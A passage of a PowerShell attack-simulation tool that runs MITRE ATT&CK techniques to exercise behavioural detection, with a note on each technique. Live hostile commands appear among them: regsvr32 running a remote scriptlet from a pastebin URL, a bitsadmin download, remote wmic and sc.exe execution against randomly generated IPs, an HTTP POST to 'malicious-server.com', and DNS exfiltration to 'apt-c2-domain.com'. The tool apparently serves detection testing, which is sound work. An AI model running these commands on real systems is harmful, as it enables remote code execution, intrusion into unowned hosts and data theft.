                $null = Test-NetConnection "www.googleapis.com" -Port 443 -WarningAction SilentlyContinue -ErrorAction SilentlyContinue

                $null = $global:executionResults.Add(@{ID="T1102.002"; Success=$true; APTGroup="APT41"; C2Type="GoogleCalendar"})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1102.002"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Web service C2 (Google Calendar, Twitter, Pastebin, GitHub) blends malicious traffic with legitimate cloud services, evading traditional network security. UEBA detects unusual API calls to cloud services, excessive calendar event creation, suspicious GitHub gist access, or anomalous social media activity from endpoints. Monitor for Base64-encoded data in calendar events, encoded tweets, or GitHub commits from non-developer workstations. This technique bypasses URL filtering and DLP because traffic appears legitimate."
            RealWorldUsage = "APT41's Shadow Harvest campaign uses Google Calendar API to create zero-duration events with Base64-encoded C2 commands in event descriptions. APT29 and Turla use Twitter, GitHub, and Reddit for C2 communication. Malware embeds commands in Instagram photos (steganography), Pastebin posts, or Slack messages. Web service C2 is highly effective because traffic is encrypted HTTPS to trusted domains (*.google.com, *.twitter.com), bypassing most security controls while providing reliable bidirectional communication for command execution and data exfiltration."
        }
    },
    
    # === NEW SOPHISTICATED EXECUTION TECHNIQUES ===
    @{
        ID = 'T1218.010'
        Name = 'System Binary Proxy Execution: Regsvr32'
        Tactic = 'Execution'
        ValidationRequired = $null
        Action = {
            try {
                $payloadUrl = "https://pastebin.com/raw/TechUpdate2025"
                regsvr32.exe /s /u "/i:$($payloadUrl)" scrobj.dll | Out-Null
                Log-AttackStep "Command: regsvr32.exe /s /u /i:$($payloadUrl) scrobj.dll" "T1218.010"
                $null = $global:executionResults.Add(@{ID="T1218.010"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1218.010"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Regsvr32.exe proxy execution is a powerful application whitelisting bypass. UEBA detects regsvr32 with /s (silent), /u (unregister), /i (call DllInstall) flags, especially with network URLs. Monitor for regsvr32 spawning from unusual parents, making network connections, or executing .sct (scriptlet) files. This LOLBin technique enables fileless code execution from remote servers, bypassing many security controls that trust signed Microsoft binaries."
            RealWorldUsage = "Made famous by 'Squiblydoo' attack, used by APT groups (FIN7, Cobalt Group) and penetration testers. Regsvr32 downloads and executes scriptlets (.sct files) containing JavaScript/VBScript from remote servers without writing malicious executables to disk. Bypasses application whitelisting because regsvr32.exe is Microsoft-signed and whitelisted in most environments. Enables attackers to execute arbitrary code while appearing as legitimate DLL registration activity. Critical component of fileless malware and living-off-the-land techniques."
        }
    },
    @{
        ID = 'T1197'
        Name = 'BITS Jobs'
        Tactic = 'Execution'
        ValidationRequired = $null
        Action = {
            $payloadUrl = "https://www.microsoft.com/en-us/download/details.aspx?id=100000"
            $destFile = "C:\Users\Public\WindowsUpdate_Cache.tmp"
            $script:bitsFile = $destFile # Store for cleanup
            try {
                bitsadmin.exe /transfer "WindowsUpdateCheck" /download /priority normal $payloadUrl $destFile | Out-Null
                Log-AttackStep "Command: bitsadmin.exe /transfer ""WindowsUpdateCheck"" /download $payloadUrl $destFile" "T1197"
                $null = $global:executionResults.Add(@{ID="T1197"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1197"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = {
            if ($script:bitsFile -and (Test-Path $script:bitsFile)) {
                try {
                    Remove-Item -Path $script:bitsFile -Force -ErrorAction SilentlyContinue | Out-Null
                    $null = $global:cleanupReport.Add(@{ID="T1197"; Status="Success"; Details="Removed downloaded file $($script:bitsFile)"})
                } catch {
                    $null = $global:cleanupReport.Add(@{ID="T1197"; Status="Failed"; Error=$_.Exception.Message})
                }
            }
        }
        Description = @{
            WhyTrack = "BITS (Background Intelligent Transfer Service) enables stealthy file downloads that survive reboots and resume automatically. UEBA detects bitsadmin.exe usage, suspicious BITS jobs via Get-BitsTransfer, and BITS job creation outside Windows Update. Monitor for BITS downloads from external IPs, unusual download destinations, and BITS jobs with high priority. BITS traffic often bypasses egress filtering because it's legitimate Windows Update infrastructure, making behavioral detection critical."
            RealWorldUsage = "APT41, FIN7, and Qbot malware abuse BITS for stealthy payload downloads. BITS can throttle bandwidth to evade network anomaly detection, set low priority to avoid resource monitoring, and persist across reboots (downloads resume automatically). Used for downloading Cobalt Strike beacons, post-exploitation tools, and ransomware payloads. BITS jobs can be scheduled for execution at specific times, enabling delayed payload deployment. Attackers leverage BITS because transfers appear as Windows Update traffic, trusted by most security controls."
        }
    },
    
    # === NEW SOPHISTICATED DISCOVERY TECHNIQUES ===
    @{
        ID = 'T1482'
        Name = 'Domain Trust Discovery'
        Tactic = 'Discovery'
        ValidationRequired = { Test-DomainJoined }
        Action = {
            try {
                $output = nltest /domain_trusts | Out-Null
                Log-AttackStep "Command: nltest /domain_trusts" "T1482"
                $null = $global:executionResults.Add(@{ID="T1482"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1482"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Domain trust discovery maps the entire AD forest structure, revealing parent/child domains, external trusts, and forest trusts critical for enterprise-wide attacks. UEBA detects nltest.exe, dsquery, and PowerShell ActiveDirectory module usage for trust enumeration. This reconnaissance reveals paths for privilege escalation across domain boundaries and identifies high-value targets in trusted domains. Essential for detecting sophisticated attacks targeting multi-domain environments."
            RealWorldUsage = "APT groups targeting enterprises use nltest /domain_trusts and PowerShell Get-ADTrust to map domain architectures before launching forest-wide attacks. Critical for ransomware planning domain-wide encryption and APT operations seeking paths to parent domains or external partner networks. Enables attackers to identify weak trust relationships and plan golden ticket attacks across domain boundaries. Used by NotPetya, APT29, and other sophisticated actors for understanding enterprise AD topology before widespread compromise."
        }
    },
    @{
        ID = 'T1518.001'
        Name = 'Security Software Discovery (WMI)'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = {
            try {
                $secSoftware = Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -like '*defender*' -or $_.Name -like '*sysmon*' } | Out-Null
                Log-AttackStep "Command: Get-CimInstance -ClassName Win32_Process | Where-Object { Name -like '*defender*' }" "T1518.001"
                $null = $global:executionResults.Add(@{ID="T1518.001"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1518.001"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Security software discovery reveals defensive capabilities, enabling attackers to select evasion techniques. UEBA detects WMI queries for AV/EDR processes (Defender, Carbon Black, CrowdStrike, Sysmon), registry checks for security products, and tasklist filtering for security services. Fileless WMI queries are stealthy but detectable through behavioral analytics. Critical for understanding which defense evasion techniques will be effective against deployed security stack."
            RealWorldUsage = "Standard pre-attack reconnaissance by APT groups and ransomware operators. Malware checks for sandboxes (VMware Tools, VBox), AV products, and EDR before deploying payloads. Emotet, TrickBot, and ransomware families enumerate security software to determine if environment is worth attacking or needs specialized evasion. APT groups use WMI queries and registry enumeration (HKLM\\SOFTWARE\\Microsoft\\Windows Defender) to profile security posture before launching attacks, selecting techniques least likely to be detected."
        }
    },
    @{
        ID = 'T1063'
        Name = 'Firewall Rule Discovery'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = {
            try {
                $rules = Get-NetFirewallRule -Action Allow -Direction Outbound -Enabled True | Out-Null
                Log-AttackStep "Command: Get-NetFirewallRule -Action Allow -Direction Outbound" "T1063"
                $null = $global:executionResults.Add(@{ID="T1063"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1063"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Firewall rule enumeration reveals allowed outbound connections attackers can abuse for C2 and exfiltration. UEBA detects Get-NetFirewallRule, netsh advfirewall, and registry queries for firewall config. Attackers identify allowed ports/protocols to blend malicious traffic with legitimate applications. Monitor for unusual firewall enumeration, especially by non-admin users or from compromised service accounts. This reconnaissance determines which C2 channels will evade egress filtering."
            RealWorldUsage = "APT groups enumerate firewall rules to select C2 protocols (HTTPS/443, DNS/53) that won't be blocked. Ransomware checks for blocked SMB ports before lateral movement attempts. Malware identifies allowed applications to inject into or masquerade as. Attackers leverage existing rules for Dropbox, OneDrive, or web browsers to exfiltrate data through whitelisted applications. Critical for C2 infrastructure planning and selecting exfiltration methods that bypass network security controls."
        }
    },

    # === NEW SOPHISTICATED LATERAL MOVEMENT TECHNIQUES ===
    @{
        ID = 'T1047'
        Name = 'Remote Process Execution (WMI)'
        Tactic = 'Lateral Movement'
        ValidationRequired = { Test-DomainJoined }
        Action = {
            $targetIP = Generate-RandomIP
            try {
                wmic /node:"$targetIP" process call create "calc.exe" | Out-Null
                Log-AttackStep "Command: wmic /node:`"$targetIP`" process call create `"calc.exe`"" "T1047"
                $null = $global:executionResults.Add(@{ID="T1047"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1047"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "WMI remote execution is a premier LOLBin for lateral movement, blending with legitimate admin activity. UEBA detects unusual wmic.exe remote process creation, Invoke-WmiMethod, and CIM cmdlets targeting multiple systems. Monitor Event ID 4688 (process creation) on source and Event ID 4648 (explicit credentials) showing remote WMI execution. WMI leaves minimal forensic footprint compared to PsExec, making behavioral detection critical for identifying lateral movement patterns."
            RealWorldUsage = "Universal technique for APT lateral movement and ransomware propagation. Used by APT29, APT32, Lazarus, and virtually all ransomware families (Conti, LockBit, REvil, Ryuk). WMI enables fileless remote execution without deploying binaries, executing commands in memory on remote systems. Cobalt Strike and Impacket (wmiexec.py) heavily leverage WMI for post-exploitation. Preferred over PsExec because it's quieter, doesn't require SMB file writes, and appears as legitimate system administration in many environments."
        }
    },
    @{
        ID = 'T1569.002'
        Name = 'Remote Service Creation (SC)'
        Tactic = 'Lateral Movement'
        ValidationRequired = { Test-DomainJoined -and Test-AdminPrivileges }
        Action = {
            $targetIP = Generate-RandomIP
            $svcName = "StealthSvc_Remote_$($random.Next(1000))"
            $script:remoteSvc = @{ Name = $svcName; Target = $targetIP }
            try {
                sc.exe \\$targetIP create $svcName binPath= "C:\Windows\System32\calc.exe" | Out-Null
                Log-AttackStep "Command: sc.exe \\$targetIP create `"$svcName`" binPath= `"calc.exe`"" "T1569.002"
                $null = $global:executionResults.Add(@{ID="T1569.002"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1569.002"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = {
            if ($script:remoteSvc) {
                try {
                    sc.exe \\$($script:remoteSvc.Target) delete $($script:remoteSvc.Name) | Out-Null
                    $null = $global:cleanupReport.Add(@{ID="T1569.002"; Status="Success"; Details="Removed remote service $($script:remoteSvc.Name) from $($script:remoteSvc.Target)"})
                } catch {
                    $null = $global:cleanupReport.Add(@{ID="T1569.002"; Status="Failed"; Error=$_.Exception.Message})
                }
            }
        }
        Description = @{
            WhyTrack = "Remote service creation via sc.exe provides SYSTEM-level code execution and persistence on target systems. UEBA detects sc.exe with remote UNC paths, PowerShell New-Service -ComputerName, and PsExec service creation. Monitor Event IDs 4697 (service installed), 7045 (service creation), and 4688 for sc.exe with network paths. Services created remotely often have suspicious binary paths, run as SYSTEM, and execute immediately, making them high-confidence lateral movement indicators."
            RealWorldUsage = "Used by APT groups and ransomware for lateral movement with SYSTEM privileges. PsExec creates temporary services for remote execution. Ransomware operators (Conti, REvil) create services on domain controllers and file servers for widespread encryption. Cobalt Strike's PsExec_psh module creates services for beacon deployment. Services provide persistent footholds on critical infrastructure, surviving reboots and enabling repeated access. Combined with stolen admin credentials, enables rapid compromise of multiple systems with full SYSTEM privileges."
        }
    },
    
    # === NEW SOPHISTICATED EXFILTRATION TECHNIQUES ===
    @{
        ID = 'T1041.001' # More specific ID
        Name = 'Exfiltration Over C2 Channel (HTTP POST)'
        Tactic = 'Exfiltration'
        ValidationRequired = $null
        Action = {
            $c2Url = "http://malicious-server.com/upload" # A fake C2 server
            $exfilData = Get-Process | Select-Object -First 5 | ConvertTo-Csv -NoTypeInformation
            try {
                Invoke-WebRequest -Uri $c2Url -Method POST -Body $exfilData -ErrorAction Stop | Out-Null
                Log-AttackStep "Command: Invoke-WebRequest -Uri $c2Url -Method POST -Body <data>" "T1041.001"
                $null = $global:executionResults.Add(@{ID="T1041.001"; Success=$true})
            } catch {
                # This will fail, which is expected as the C2 doesn't exist. We log it as a success for simulation.
                Log-AttackStep "Command: Invoke-WebRequest -Uri $c2Url -Method POST -Body <data> (Simulated)" "T1041.001"
                $null = $global:executionResults.Add(@{ID="T1041.001"; Success=$true})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "HTTP POST exfiltration blends data theft with legitimate web traffic, evading simple egress filtering. UEBA detects unusual POST requests with large payloads, posts to suspicious domains, or encoded/encrypted POST bodies from unexpected processes. Monitor for PowerShell Invoke-WebRequest/Invoke-RestMethod with POST methods, especially to non-whitelisted domains. CSV, JSON, or Base64-encoded data in POST bodies indicates data exfiltration. Correlation with data staging (file compression, temp directory writes) strengthens detection."
            RealWorldUsage = "APT41 disguises C2 traffic as SharePoint or O365 API calls using HTTPS POST requests with legitimate-looking User-Agents and API endpoints. APT groups exfiltrate credentials, intellectual property, and system information via POST to attacker-controlled servers. Malware uses JSON/XML POST requests mimicking legitimate application traffic. HTTPS encryption prevents DLP content inspection, making behavioral detection critical. Common pattern: stage data → encode → POST to C2 → receive confirmation → delete local files."
        }
    },
    @{
        ID = 'T1048.003'
        Name = 'Exfiltration Over Alternative Protocol: DNS'
        Tactic = 'Exfiltration'
        ValidationRequired = $null
        Action = {
            $exfilData = "SensitiveUserData"
            $encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($exfilData)) -replace '=', ''
            $chunkSize = 30
            $chunks = ($encodedData -split "(.{$chunkSize})").Trim() | Where-Object {$_}
            $c2Domain = "apt-c2-domain.com" # Fake attacker domain
            try {
                foreach($chunk in $chunks){
                    nslookup "$chunk.$c2Domain" 8.8.8.8 | Out-Null
                }
                Log-AttackStep "Command: nslookup <encoded_data>.$c2Domain" "T1048.003"
                $null = $global:executionResults.Add(@{ID="T1048.003"; Success=$true})
            } catch {
                Log-AttackStep "Command: nslookup <encoded_data>.$c2Domain (Simulated)" "T1048.003"
                $null = $global:executionResults.Add(@{ID="T1048.003"; Success=$true})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "DNS exfiltration is one of the stealthiest data theft techniques because DNS queries are rarely blocked by firewalls. UEBA detects abnormally long DNS queries, high volume of queries to suspicious domains, Base64-encoded subdomains, and unusual DNS query patterns (rapid sequential queries). Monitor for nslookup/dig to non-corporate DNS servers, PowerShell DNS queries, and DNS traffic to newly-registered or low-reputation domains. DNS tunneling tools (dnscat2, iodine) create distinctive traffic patterns detectable through behavioral analytics."
            RealWorldUsage = "FIN7, APT28, and sophisticated APT groups use DNS tunneling to exfiltrate credentials, encryption keys, and small high-value data from air-gapped or heavily monitored networks. Attackers encode data in Base64, chunk it into 30-63 character segments (DNS label limits), and embed in subdomains (encoded-data.attacker-c2.com). DNS queries bypass most DLP and egress filtering because port 53 is universally allowed. Particularly effective in environments with strict egress filtering where only DNS traffic is permitted outbound."
        }
    },
    @{
        ID = 'T1486'
        Name = 'Data Encrypted for Impact'
        Tactic = 'Impact'
        ValidationRequired = $null
        Action = {
            try {
                $tempFile = "$env:TEMP\magneto_ransomware_sim.txt"
                "SIMULATION: This file would be encrypted by ransomware" | Out-File $tempFile
                $encrypted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content $tempFile)))
                $encrypted | Out-File "$tempFile.encrypted"
                Log-AttackStep "Simulated ransomware encryption" "T1486"
                $null = $global:executionResults.Add(@{ID="T1486"; Success=$true; File=$tempFile})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1486"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = {
            try {
                Remove-Item "$env:TEMP\magneto_ransomware_sim.txt*" -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        Description = @{
            WhyTrack = "Ransomware encryption is the final impact stage of most ransomware attacks. Detection requires monitoring for mass file modifications, unusual encryption API calls, and rapid file system changes."
            RealWorldUsage = "Used by LockBit, BlackCat, Royal, REvil, and virtually all ransomware families. Critical for Healthcare, Financial Services, and all verticals."
        }
    },
    @{
        ID = 'T1490'
        Name = 'Inhibit System Recovery'
        Tactic = 'Impact'
        ValidationRequired = { Test-AdminPrivileges }
        Action = {
            try {
                vssadmin list shadows | Out-Null
                Log-AttackStep "Command: vssadmin list shadows (simulated deletion)" "T1490"
                $null = $global:executionResults.Add(@{ID="T1490"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1490"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Ransomware groups delete Volume Shadow Copies to prevent recovery. Monitor for vssadmin, wbadmin, and bcdedit commands."
            RealWorldUsage = "Standard ransomware tactic used by LockBit, BlackCat, Conti, REvil. Prevents victims from recovering encrypted files."
        }
    },
    @{
        ID = 'T1489'
        Name = 'Service Stop'
        Tactic = 'Impact'
        ValidationRequired = { Test-AdminPrivileges }
        Action = {
            try {
                sc query state=all | Out-Null
                Log-AttackStep "Command: sc query (simulated service stop)" "T1489"
                $null = $global:executionResults.Add(@{ID="T1489"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1489"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Ransomware stops security services, backup services, and databases before encryption. Monitor for sc stop, net stop, and Stop-Service commands."
            RealWorldUsage = "Used by all major ransomware families to disable AV, backup, and security services before encryption."
        }
    },
    @{
        ID = 'T1566.001'
        Name = 'Phishing: Spearphishing Attachment'
        Tactic = 'Initial Access'
        ValidationRequired = $null
        Action = {
            try {
                $simEmail = "From: attacker@malicious.com`nSubject: Invoice #12345`nAttachment: invoice.pdf.exe"
                Log-AttackStep "Simulated phishing email with malicious attachment" "T1566.001"
                $null = $global:executionResults.Add(@{ID="T1566.001"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1566.001"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Primary initial access method for most APT groups and ransomware. Monitor email gateways for malicious attachments, macros, and executable files."
            RealWorldUsage = "Used by 90% of ransomware attacks including LockBit, BlackCat, and all major APT groups."
        }
    },
    @{
        ID = 'T1078'
        Name = 'Valid Accounts'
        Tactic = 'Defense Evasion'
        ValidationRequired = $null
        Action = {
            try {
                net user $env:USERNAME | Out-Null
                Log-AttackStep "Using valid account: $env:USERNAME" "T1078"
                $null = $global:executionResults.Add(@{ID="T1078"; Success=$true; Account=$env:USERNAME})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1078"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Attackers use stolen credentials to blend in with normal user activity. Monitor for unusual login times, locations, and access patterns."
            RealWorldUsage = "Universal technique across all threat actors. Critical for persistence and lateral movement in healthcare, financial, and government sectors."
        }
    },
    @{
        ID = 'T1082'
        Name = 'System Information Discovery'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = {
            try {
                systeminfo | Out-Null
                Log-AttackStep "Command: systeminfo" "T1082"
                $null = $global:executionResults.Add(@{ID="T1082"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1082"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Reconnaissance command used to identify system details, patch level, and architecture. Monitor for systeminfo, wmic os, and Get-ComputerInfo commands."
            RealWorldUsage = "Universal reconnaissance technique used by all APT groups and ransomware to identify targets and determine exploitability."
        }
    },
    @{
        ID = 'T1083'
        Name = 'File and Directory Discovery'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = {
            try {
                dir $env:USERPROFILE\Documents | Out-Null
                Log-AttackStep "Command: dir (file discovery)" "T1083"
                $null = $global:executionResults.Add(@{ID="T1083"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1083"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Attackers enumerate files to locate sensitive data, databases, and high-value targets before exfiltration or encryption."
            RealWorldUsage = "Standard reconnaissance used by all ransomware and APT groups to identify valuable data for theft or encryption."
        }
    },
    @{
        ID = 'T1018'
        Name = 'Remote System Discovery'
        Tactic = 'Discovery'
        ValidationRequired = $null
        Action = {
            try {
                net view | Out-Null
                Log-AttackStep "Command: net view" "T1018"
                $null = $global:executionResults.Add(@{ID="T1018"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1018"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Network discovery to identify lateral movement targets. Monitor for net view, arp, and nltest commands."
            RealWorldUsage = "Used by ransomware for network mapping before lateral movement and by APT groups for espionage campaigns."
        }
    },
    @{
        ID = 'T1005'
        Name = 'Data from Local System'
        Tactic = 'Collection'
        ValidationRequired = $null
        Action = {
            try {
                Get-ChildItem $env:USERPROFILE -Recurse -Filter *.txt -ErrorAction SilentlyContinue | Select-Object -First 5 | Out-Null
                Log-AttackStep "Simulated data collection from local system" "T1005"
                $null = $global:executionResults.Add(@{ID="T1005"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1005"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Collection of sensitive files from local drives before exfiltration. Monitor for unusual file access patterns and bulk file reads."
            RealWorldUsage = "Used by all data theft operations including ransomware double-extortion, APT espionage, and insider threats."
        }
    },
    @{
        ID = 'T1560.001'
        Name = 'Archive via Utility'
        Tactic = 'Collection'
        ValidationRequired = $null
        Action = {
            try {
                $tempFile = "$env:TEMP\magneto_collection.txt"
                "Simulated sensitive data" | Out-File $tempFile
                Compress-Archive -Path $tempFile -DestinationPath "$env:TEMP\magneto_data.zip" -Force
                Log-AttackStep "Command: Compress-Archive (data staging)" "T1560.001"
                $null = $global:executionResults.Add(@{ID="T1560.001"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1560.001"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = {
            try {
                Remove-Item "$env:TEMP\magneto_collection.txt" -Force -ErrorAction SilentlyContinue
                Remove-Item "$env:TEMP\magneto_data.zip" -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        Description = @{
            WhyTrack = "Data archiving before exfiltration. Monitor for zip, rar, 7z, and Compress-Archive commands on sensitive directories."
            RealWorldUsage = "Standard data theft technique used by ransomware for double-extortion and APT groups for espionage."
        }
    },
    @{
        ID = 'T1021.001'
        Name = 'Remote Desktop Protocol'
        Tactic = 'Lateral Movement'
        ValidationRequired = $null
        Action = {
            try {
                qwinsta | Out-Null
                Log-AttackStep "Command: qwinsta (RDP session enumeration)" "T1021.001"
                $null = $global:executionResults.Add(@{ID="T1021.001"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1021.001"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "RDP is heavily abused for lateral movement and ransomware deployment. Monitor for unusual RDP connections, especially to servers and from workstations."
            RealWorldUsage = "Primary lateral movement method for ransomware including LockBit, BlackCat. Healthcare sector commonly targeted via RDP."
        }
    },
    @{
        ID = 'T1529'
        Name = 'System Shutdown/Reboot'
        Tactic = 'Impact'
        ValidationRequired = { Test-AdminPrivileges }
        Action = {
            try {
                shutdown /? | Out-Null
                Log-AttackStep "Command: shutdown (simulated - not executed)" "T1529"
                $null = $global:executionResults.Add(@{ID="T1529"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1529"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "ICS/SCADA attacks and destructive malware use shutdown commands to disrupt operations."
            RealWorldUsage = "Used in Energy sector attacks, ICS/SCADA targeting by APT33, Dragonfly, and destructive malware like NotPetya."
        }
    },
    @{
        ID = 'T1020'
        Name = 'Automated Exfiltration'
        Tactic = 'Exfiltration'
        ValidationRequired = $null
        Action = {
            try {
                $script:exfilScript = "$env:TEMP\magneto_autoexfil.ps1"
                "# Simulated auto-exfiltration script" | Out-File $script:exfilScript
                Log-AttackStep "Created automated exfiltration script" "T1020"
                $null = $global:executionResults.Add(@{ID="T1020"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1020"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = {
            try {
                Remove-Item "$env:TEMP\magneto_autoexfil.ps1" -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        Description = @{
            WhyTrack = "APT groups automate data theft using scheduled tasks and scripts. Monitor for automated file transfers and data staging."
            RealWorldUsage = "Used by APT29, APT28, APT41 for espionage campaigns in Government and Defense sectors."
        }
    },
    @{
        ID = 'T1074.001'
        Name = 'Local Data Staging'
        Tactic = 'Collection'
        ValidationRequired = $null
        Action = {
            try {
                $stagingDir = "$env:TEMP\magneto_staging"
                New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
                "Simulated staged data" | Out-File "$stagingDir\data.txt"
                Log-AttackStep "Created staging directory: $stagingDir" "T1074.001"
                $null = $global:executionResults.Add(@{ID="T1074.001"; Success=$true; StagingDir=$stagingDir})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1074.001"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = {
            try {
                Remove-Item "$env:TEMP\magneto_staging" -Recurse -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        Description = @{
            WhyTrack = "Attackers centralize collected data in staging areas before exfiltration. Monitor for unusual file copying to temp directories."
            RealWorldUsage = "Standard technique in ransomware double-extortion and APT data theft operations across all verticals."
        }
    },
    @{
        ID = 'T1190'
        Name = 'Exploit Public-Facing Application'
        Tactic = 'Initial Access'
        ValidationRequired = $null
        Action = {
            try {
                $webRequest = "GET / HTTP/1.1`nHost: vulnerable-server.com`nUser-Agent: AttackerScanner"
                Log-AttackStep "Simulated web application exploit attempt" "T1190"
                $null = $global:executionResults.Add(@{ID="T1190"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1190"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Initial access via vulnerable web apps, VPNs, and exposed services. Monitor for unusual web requests and exploit attempts."
            RealWorldUsage = "Critical for Energy, Telecom, and Government sectors. Used by APT33, APT28 to exploit Exchange, VPNs, and web portals."
        }
    },
    @{
        ID = 'T1133'
        Name = 'External Remote Services'
        Tactic = 'Persistence'
        ValidationRequired = $null
        Action = {
            try {
                netstat -an | Select-String "3389|443|22" | Out-Null
                Log-AttackStep "Enumerated remote service ports (RDP, HTTPS, SSH)" "T1133"
                $null = $global:executionResults.Add(@{ID="T1133"; Success=$true})
            } catch {
                $null = $global:executionResults.Add(@{ID="T1133"; Success=$false; Error=$_.Exception.Message})
            }
        }
        CleanupAction = $null
        Description = @{
            WhyTrack = "Persistence via VPN, RDP, and remote access tools. Monitor for unusual remote access from external IPs."
            RealWorldUsage = "Primary persistence for Energy, Telecom sectors. Used by APT29, APT28 for long-term access to critical infrastructure."
        }
    }
)

# Check for ListTactics or ListTechniques
if ($ListTactics) {
    Write-Host "`nAvailable MITRE ATT&CK Tactics in MAGNETO v3:" -ForegroundColor Cyan
    Write-Host "=" * 80 -ForegroundColor DarkGray
    
    $tacticStats = $techniques | Group-Object -Property { $_.Tactic } | Sort-Object Name | ForEach-Object {
        [PSCustomObject]@{
            Tactic = $_.Name
            Count = $_.Count
            AdminRequired = ($_.Group | Where-Object { $_.ValidationRequired -and $_.ValidationRequired.ToString() -match "Test-AdminPrivileges" }).Count
            DomainRequired = ($_.Group | Where-Object { $_.ValidationRequired -and $_.ValidationRequired.ToString() -match "Test-DomainJoined" }).Count
        }
    }
    
    foreach ($stat in $tacticStats) {
        $specialReqs = @()
        if ($stat.AdminRequired -gt 0) { $specialReqs += "$($stat.AdminRequired) require admin" }
        if ($stat.DomainRequired -gt 0) { $specialReqs += "$($stat.DomainRequired) require domain" }
        $reqString = if ($specialReqs.Count -gt 0) { " ($($specialReqs -join ', '))" } else { "" }
        
        Write-Host ("  {0,-25} : {1,2} techniques{2}" -f $stat.Tactic, $stat.Count, $reqString) -ForegroundColor Yellow
    }
    
    Write-Host "`nTotal tactics: $($tacticStats.Count)" -ForegroundColor Green
    Write-Host "Total techniques: $($techniques.Count)" -ForegroundColor Green
    exit 0
}

if ($ListTechniques) {
    Write-Host "`nAvailable MITRE ATT&CK Techniques in MAGNETO v3:" -ForegroundColor Cyan
    Write-Host "=" * 80 -ForegroundColor DarkGray
    
    $tacticGroups = $techniques | Group-Object -Property { $_.Tactic } | Sort-Object Name
    
    foreach ($group in $tacticGroups) {
        Write-Host "`n[$($group.Name)]" -ForegroundColor Magenta
        foreach ($tech in $group.Group | Sort-Object ID) {
            $adminReq = if ($tech.ValidationRequired -and $tech.ValidationRequired.ToString() -match "Test-AdminPrivileges") { " [ADMIN]" } else { "" }
            $domainReq = if ($tech.ValidationRequired -and $tech.ValidationRequired.ToString() -match "Test-DomainJoined") { " [DOMAIN]" } else { "" }
            $aptTag = if ($tech.APTGroup) { " [APT:$($tech.APTGroup)]" } else { "" }
